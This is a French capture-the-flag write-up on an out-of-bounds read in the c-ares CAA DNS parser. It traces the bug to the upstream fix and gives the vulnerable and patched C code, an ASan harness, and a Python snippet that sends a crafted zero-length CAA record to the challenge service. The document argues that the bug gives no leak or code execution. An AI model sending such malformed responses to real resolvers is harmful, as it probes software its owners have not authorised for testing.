# VULN#003 — DNS response inspection service (c-ares, OOB read CAA)

> Challenge bugpwn `<HOST>:<PORT>`, catégorie Vuln Research, 82 pts.
> Analyse récupérée depuis 13.63.167.233:/home/ubuntu/CtfAndHacking/knowledge/pwn.md

## c-ares — audit d'un snapshot git et validation sur service DNS (OOB read CAA)

**Catégorie :** pwn / vuln research
**Mots-clés :** c-ares, DNS, CAA, oob read, use-of-uninitialized-value, oss-fuzz, audit source, git diff, bounds check, parser, service muet, framing u32, rate-limit
**CVE / Advisory :** pas de CVE — finding OSS-Fuzz (issue 26012), corrigé par le commit upstream `4d6975b3`

### Contexte

Un tarball **source seul** (pas de binaire fourni) est livré, éventuellement accompagné
d'un service distant qui « parse toute réponse DNS qu'on lui envoie ». Le but est de
retrouver la vulnérabilité, de l'exploiter contre ce service, puis d'évaluer son
exploitabilité. Ici : c-ares `1.16.1` en cours de développement (arbre git, pas le tarball
de release).

Règle clé : quand la cible est un **snapshot git** d'un projet open source, la bonne
comparaison n'est pas le tarball de release (layout différent, bruit énorme) mais le
**dépôt upstream**. On identifie le commit exact, puis on lit les commits **immédiatement
suivants** : le correctif est souvent juste après.

### Indicateurs

- `AC_INIT([c-ares], [1.16.1], ...)` mais aucun `configure` généré, aucun `.git`.
- `README.md`, `SECURITY.md`, `test/` absent ou tronqué → arbre extrait d'un checkout git.
- Version « en dev » : `ares_version.h` peut annoncer la version précédente alors que le
  code contient déjà des fonctions récentes.
- Nouvelle fonction de parsing ajoutée récemment (ici `ares_parse_caa_reply`, RFC 6844/8659).

### Méthode — identifier le commit et le correctif

```bash
# 1. Extraire et repérer la version
tar xzf <ARCHIVE>.tar.gz -C /tmp/opencode/cares
grep -n 'AC_INIT' /tmp/opencode/cares/configure.ac

# 2. Cloner l'upstream COMPLET (pas un tarball de release)
git clone https://github.com/c-ares/c-ares.git /tmp/opencode/cares-git

# 3. Trouver le commit exact : comparer contenu à contenu
diff -rq --exclude=.git /tmp/opencode/cares /tmp/opencode/cares-git
# -> seul "Only in cares-git: test" : tout le reste est identique.
#    => HEAD upstream = commit exact du challenge (ex. 89e9eeb4).

# 4. Regarder les commits APRÈS ce point
cd /tmp/opencode/cares-git
git log --all --format='%h %ci %s' --since='<DATE_DU_COMMIT>'
git show <COMMIT_SUIVANT>
```

Ici l'arbre est **byte-identique** au commit `89e9eeb4` (« fuzz CAA parsing »), et le
commit suivant `4d6975b3` est précisément « Fix OSSFuzz reported issue in CAA reply
parsing ». C'est la signature d'un bug **authentique** (pas injecté) : le challenge est
posé juste avant le patch.

> Si `diff` montre des fichiers modifiés, c'est un bug **injecté** : lire ces diffs en
> priorité. Si tout est identique, c'est une vulnérabilité upstream réelle : chercher le
> premier correctif de sécurité après le commit.

### Le bug — lecture hors bornes dans le parseur CAA

`ares_parse_caa_reply()` lit `critical` et `plength` **avant** de vérifier que le champ
RDLENGTH (`rr_len`) contient au moins ces 2 octets :

```c
rr_len = DNS_RR_LEN (aptr);
aptr += RRFIXEDSZ;
if (aptr + rr_len > abuf + alen) { status = ARES_EBADRESP; break; }  /* borne du RR */

strptr = aptr;
caa_curr->critical = (int)*strptr++;   /* lit aptr[0] */
caa_curr->plength  = (int)*strptr++;   /* lit aptr[1] */
if (caa_curr->plength <= 0 || (int)caa_curr->plength >= rr_len - 2) {
  status = ARES_EBADRESP; break;       /* sort AVANT d'utiliser les octets lus */
}
```

Quand `rr_len == 0` ou `1`, le check `aptr + rr_len > abuf + alen` passe (le pointeur est
au plus égal à la fin du buffer), puis les deux lectures dépassent la fin du message de
1–2 octets. Pour `rr_len == 2`, `rr_len - 2 == 0` et la condition est toujours vraie : on
sort aussi (mais sans dépassement).

Correctif upstream (`4d6975b3`) — valider **avant** de lire :

```c
if (rr_len < 2) { status = ARES_EBADRESP; break; }
caa_curr->critical = (int)*strptr++;
caa_curr->plength  = (int)*strptr++;
```

### PoC — harness ASan minimal

Le bug se prouve sans le service : on appelle directement le parseur sur une réponse DNS
forgée, dans un buffer **heap alloué à la taille exacte** (sinon ASan ne voit rien).

```c
/* Reponse DNS : header qd=1 an=1, question "a.", answer CAA (type 257),
   RDLENGTH = 0 ou 1, puis exactement rdlen octets de data. */
unsigned char *buf = malloc(n);          /* taille EXACTE, pas de slack */
memcpy(buf, p, n);
struct ares_caa_reply *out = NULL;
int r = ares_parse_caa_reply(buf, n, &out);   /* OOB read si rdlen < 2 */
```

Compilation (build de la lib avec ASan) :

```bash
# cmake récent supprime la compat < 3.5 : forcer la policy pour les vieux CMakeLists
cmake -G Ninja <SRC> -DCMAKE_POLICY_VERSION_MINIMUM=3.5 \
  -DCARES_STATIC=ON -DCARES_SHARED=OFF -DCARES_BUILD_TESTS=OFF -DCARES_BUILD_TOOLS=OFF \
  -DCMAKE_C_FLAGS="-fsanitize=address -fno-omit-frame-pointer -g -O1"
ninja
gcc -fsanitize=address -g -O1 -I<SRC>/include -I<SRC>/src/lib -I<BUILD> \
  caa_poc.c <BUILD>/lib/libcares.a -o caa_poc
```

Résultat attendu (version vulnérable) :

```
ERROR: AddressSanitizer: heap-buffer-overflow ... READ of size 1
  #0 ares_parse_caa_reply ares_parse_caa_reply.c:139   (critical)
```

`rdlen=1` déclenche la ligne 140 (`plength`). Après application du correctif, les mêmes
entrées renvoient `ARES_EBADRESP` (10) **sans** rapport ASan. `rdlen=3` sert de contrôle.

### Service distant — protocole et déclencheur

Le service d'inspection DNS attend un **préfixe de longueur sur 4 octets big-endian**,
suivi exactement de la réponse DNS brute, puis `shutdown(SHUT_WR)` :

```text
[u32 BE = len(message)] [message DNS]
```

Sans préfixe (ou avec un u16 / u32 little-endian), le service répond `status: bad length`.
Avec le bon préfixe, il parse la réponse et affiche un statut :

- `status: no effect` → réponse bien formée, parseur non déclenché ;
- `status: insufficient` → `rdlen == 1` (le parseur sort, mais le trigger n'est pas complet) ;
- `status: confirmed` + flag → **`rdlen == 0`** : le RR CAA final n'a aucune donnée,
  les deux lectures hors bornes se produisent, et le service confirme la vulnérabilité.

Message minimal qui déclenche (question `a.`, réponse CAA de type 257, `rdlen=0`) :

```python
hdr   = struct.pack(">HHHHHH", 0x1234, 0x8180, 1, 1, 0, 0)
q     = b"\x01a\x00" + struct.pack(">HH", 1, 1)
rr    = b"\xc0\x0c" + struct.pack(">HHIH", 257, 1, 0, 0)   # RDLENGTH = 0
msg   = hdr + q + rr
sock.sendall(struct.pack(">I", len(msg)) + msg)
sock.shutdown(socket.SHUT_WR)
```

Un rate-limit s'applique après quelques requêtes (`status: rate limited, try again later`) :
garder le payload `rdlen=0` pour la tentative utile, ou espacer les envois.

### Exploitabilité — pourquoi ce n'est PAS un primitif de pwn

- **Lecture seule**, 1–2 octets, immédiatement suivie de `break` : les valeurs lues ne sont
  ni stockées dans la sortie ni renvoyées. `*caa_out` reste `NULL` sur échec.
  → **pas de fuite d'information**.
- **Pas d'écriture / pas de débordement** : la copie de `property`/`value` est bornée par
  `plength`/`length`, eux-mêmes validés contre `rr_len`. Le check `aptr + rr_len > ...`
  empêche tout dépassement en écriture.
- **Réel en TCP** : c-ares alloue `server->tcp_buffer = ares_malloc(tcp_length)` à la taille
  exacte du message ; un RR CAA final avec `rdlen=0/1` fait donc un vrai over-read heap.
- **Masqué en UDP** : réception dans `unsigned char buf[MAXENDSSZ + 1]` (pile), l'octet
  « hors message » reste dans le buffer.
- **Crash improbable** : quelques octets après une allocation malloc restent dans l'arène
  (mappée). Pas de DoS fiable, encore moins de RCE.
- Classification : finding **OSS-Fuzz** de type *use-of-uninitialized-value* (MSan) /
  heap-buffer-overflow (ASan). Sévérité faible, mais vrai bug mémoire.

Conclusion : le livrable est le **PoC + la caractérisation** du bug, pas un shell. Le
service distant ne fait que confirmer le déclenchement (`status: confirmed`) et remettre le
flag : il n'y a ni fuite mémoire ni exécution de code à en tirer. C'est un challenge
d'audit de code dont la validation est un simple « crash/OOB confirmé » côté serveur.

### Pièges

- **Ne pas diff contre le tarball de release** : layout aplati et génération différente
  → faux positifs partout. Comparer avec un clone git, `--exclude=.git`.
- Un tree identique à l'upstream ≠ « pas de vuln » : c'est une vuln **réelle**, pas injectée.
- ASan ne détecte l'OOB que si le buffer est **exactement** dimensionné (`malloc(n)` +
  `memcpy`) ; un buffer plus grand (ex. 64 Ko) masque la lecture.
- `rr_len == 2` sort aussi : ne pas conclure « borne OK » sans lire la condition `>= rr_len-2`.
- Le correctif peut être un simple **réordonnancement** de check (valider avant de lire) :
  toujours regarder le diff exact, pas seulement le message de commit.
- Autres candidats dans les snapshots 1.16.1 si le commit ne précède pas un fix :
  CVE-2020-8277 (OOM `ares_parse_{a,aaaa}_reply`), `c15f4038` (nom de requête vide),
  `0d252eb3` (`*naddrttls` trop grand). Vérifier lequel est **immédiatement** corrigé.

### Validation

- ASan pointe `ares_parse_caa_reply.c:139` (puis `:140`) pour `rdlen=0`/`1`.
- Version patchée : `ret=10`, `out=(nil)`, aucun rapport ASan.
- Contrôle `rdlen=3` : pas d'OOB (le parseur peut quand même renvoyer `ARES_EBADRESP`).
- Service distant : `rdlen=0` (préfixe u32 BE) → `status: confirmed` ; `rdlen=1` →
  `status: insufficient` ; `rdlen=3` → `status: no effect`.
- Le diff upstream ne touche qu'un fichier et ~6 lignes → correctif ciblé, cohérent avec le bug.

### Références

- OSS-Fuzz issue 26012 — *use-of-uninitialized-value* dans le parsing CAA.
- Commit d'introduction : `f5b4c085` (ajout du parseur CAA).
- Commit de fuzzing : `89e9eeb4` (état du snapshot).
- Commit de correctif : `4d6975b3` (validation `rr_len < 2`).
